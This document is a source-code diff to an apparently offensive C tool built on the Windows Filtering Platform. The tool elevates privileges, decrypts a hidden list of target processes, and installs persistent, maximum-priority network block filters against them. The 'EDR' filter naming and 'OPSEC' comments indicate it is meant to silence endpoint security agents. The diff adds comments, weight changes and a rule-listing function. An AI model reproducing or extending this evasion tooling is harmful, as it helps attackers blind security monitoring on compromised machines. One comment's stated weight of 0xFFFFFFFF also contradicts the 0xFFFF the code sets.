@@ -10,15 +10,28 @@ static DWORD AddProviderAndSubLayer(HANDLE hEngine);
 static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
 static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);
 
+/*
+ * configureNetworkFilters
+ * -----------------------
+ * Entry point for bulk configuration in WFP mode.
+ * - Elevates privileges (SeDebugPrivilege) for process enumeration and AppID lookups.
+ * - Opens the WFP engine and ensures our provider and sublayer exist via AddProviderAndSubLayer().
+ * - Decrypts the target process list and walks running processes.
+ * - For each match, resolves its full path and applies two hard-block filters (IPv4 and IPv6).
+ *
+ * Priority rationale:
+ * - Our sublayer weight is set to the maximum (0xFFFFFFFF) so arbitration prefers our sublayer first.
+ * - Each filter uses FWP_UINT64 weight of (UINT64)-1, so within our sublayer our rules dominate.
+ */
 void configureNetworkFilters() {
     if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
+    
     HANDLE hEngine = NULL;
     if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
     if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }
     
     char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
     if (!decryptedNames) { FwpmEngineClose0(hEngine); return; }
-
     for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { decryptedNames[i] = decryptString(processData[i]); }
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -45,6 +58,12 @@ void configureNetworkFilters() {
     FwpmEngineClose0(hEngine);
 }
 
+/*
+ * addProcessRule
+ * --------------
+ * Adds generic block filters for a specific process path.
+ * This is the on-demand variant of configureNetworkFilters() when a single path is provided.
+ */
 void addProcessRule(const char* processPath) {
     if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
     HANDLE hEngine = NULL;
@@ -60,6 +79,13 @@ void addProcessRule(const char* processPath) {
     FwpmEngineClose0(hEngine);
 }
 
+/*
+ * removeAllRules
+ * --------------
+ * Performs a comprehensive cleanup:
+ * - Enumerates all filters owned by our provider and deletes them.
+ * - Removes our sublayer and provider (ignoring not-found cases).
+ */
 void removeAllRules() {
     HANDLE hEngine = NULL;
     DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
@@ -98,6 +124,15 @@ void removeAllRules() {
     PRINTF("[+] Cleanup complete.\n");
 }
 
+/*
+ * ApplyGenericBlockFilterForPath
+ * ------------------------------
+ * Creates two persistent FWP_ACTION_BLOCK filters (IPv4/IPv6) bound to the process AppID.
+ *
+ * Arbitration/OPSEC notes:
+ * - We set filter weight to FWP_UINT64 with value (UINT64)-1 for absolute priority within our sublayer.
+ * - Display name uses EDR_FILTER_NAME so operators can override via compile-time macros in utils.h.
+ */
 static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
     FWP_BYTE_BLOB* appId = NULL;
     if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) { return; }
@@ -111,13 +146,16 @@ static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerG
     DWORD result = FwpmTransactionBegin0(hEngine, 0);
     if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionBegin0 failed", result); FreeAppId(appId); return; }
     
+    // Use a UINT64 variable for maximum filter weight and pass its address as required by FWPM_FILTER0
+    UINT64 maxFilterWeight = (UINT64)-1;
+
     FWPM_FILTER0 blockFilter = {0};
     blockFilter.providerKey = (GUID*)&ProviderGUID;
     blockFilter.subLayerKey = *subLayerGuid;
     blockFilter.action.type = FWP_ACTION_BLOCK;
     blockFilter.displayData.name = EDR_FILTER_NAME;
-    blockFilter.weight.type = FWP_UINT8;
-    blockFilter.weight.uint8 = 0xF;
+    blockFilter.weight.type = FWP_UINT64;
+    blockFilter.weight.uint64 = &maxFilterWeight;
     
     FWPM_FILTER_CONDITION0 condition = {0};
     blockFilter.filterCondition = &condition;
@@ -140,6 +178,13 @@ static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerG
     if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionCommit0 failed", result); FwpmTransactionAbort0(hEngine); }
     FreeAppId(appId);
 }
+/*
+ * AddProviderAndSubLayer
+ * ----------------------
+ * Idempotently creates the provider and a high-priority sublayer.
+ * - Provider is marked persistent so rules survive until explicitly removed.
+ * - Sublayer weight is set to 0xFFFFFFFF (max UINT32) to win sublayer ordering during arbitration.
+ */
 static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
     DWORD result = FwpmTransactionBegin0(hEngine, 0);
     if (result != ERROR_SUCCESS) {
@@ -164,7 +209,8 @@ static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
     subLayer.displayData.name = EDR_SUBLAYER_NAME;
     subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
     subLayer.providerKey = (GUID*)&ProviderGUID;
-    subLayer.weight = 0xFFFF; // MAX WEIGHT
+    // weight is UINT16; use its maximum value for highest priority
+    subLayer.weight = 0xFFFF;
     subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
     result = FwpmSubLayerAdd0(hEngine, &subLayer, NULL);
     if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
@@ -181,6 +227,12 @@ static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
     return result;
 }
 
+/*
+ * RemoveFiltersForProcess
+ * -----------------------
+ * Removes all filters for a given process AppID across key layers (ALE connect and outbound transport,
+ * IPv4 and IPv6). Used by removeRulesByPath() and during cleanup scenarios.
+ */
 static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
     FWP_BYTE_BLOB* appId = NULL;
     DWORD result = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
@@ -235,6 +287,60 @@ static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
     FreeAppId(appId);
 }
 
+/*
+ * listRules
+ * ---------
+ * Enumerates all filters owned by our provider and prints their IDs and names.
+ * Useful for operators to discover filter IDs for targeted removals.
+ */
+void listRules() {
+    HANDLE hEngine = NULL;
+    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
+    if (result != ERROR_SUCCESS) {
+        PrintDetailedError("FwpmEngineOpen0 failed", result);
+        return;
+    }
+
+    HANDLE enumHandle = NULL;
+    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = {0};
+    enumTemplate.providerKey = (GUID*)&ProviderGUID;
+
+    result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
+    if (result != ERROR_SUCCESS) {
+        PrintDetailedError("FwpmFilterCreateEnumHandle0 failed", result);
+        FwpmEngineClose0(hEngine);
+        return;
+    }
+
+    FWPM_FILTER0** filters = NULL;
+    UINT32 numEntries = 0;
+    result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
+    if (result != ERROR_SUCCESS) {
+        PrintDetailedError("FwpmFilterEnum0 failed", result);
+        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
+        FwpmEngineClose0(hEngine);
+        return;
+    }
+
+    PRINTF("[+] Found %u filter(s) for provider.\n", numEntries);
+    for (UINT32 i = 0; i < numEntries; i++) {
+        UINT64 id = filters[i]->filterId;
+        const wchar_t* name = filters[i]->displayData.name ? filters[i]->displayData.name : L"(no name)";
+        WPRINTF(L"    ID: %llu  Name: %s\n", id, name);
+    }
+
+    if (filters) {
+        FwpmFreeMemory0((void**)&filters);
+    }
+    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
+    FwpmEngineClose0(hEngine);
+}
+
+/*
+ * removeRulesByPath
+ * -----------------
+ * Converts a process path to AppID and removes all matching filters across supported layers.
+ */
 void removeRulesByPath(const char* processPath) {
     if (!EnableSeDebugPrivilege()) {
         EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
@@ -260,6 +366,12 @@ void removeRulesByPath(const char* processPath) {
     FwpmEngineClose0(hEngine);
 }
 
+/*
+ * removeRuleById
+ * --------------
+ * Deletes a specific filter by its numeric ID.
+ * Typically used after operators retrieve IDs via listRules().
+ */
 void removeRuleById(UINT64 ruleId) {
     HANDLE hEngine = NULL;
     DWORD result = 0;
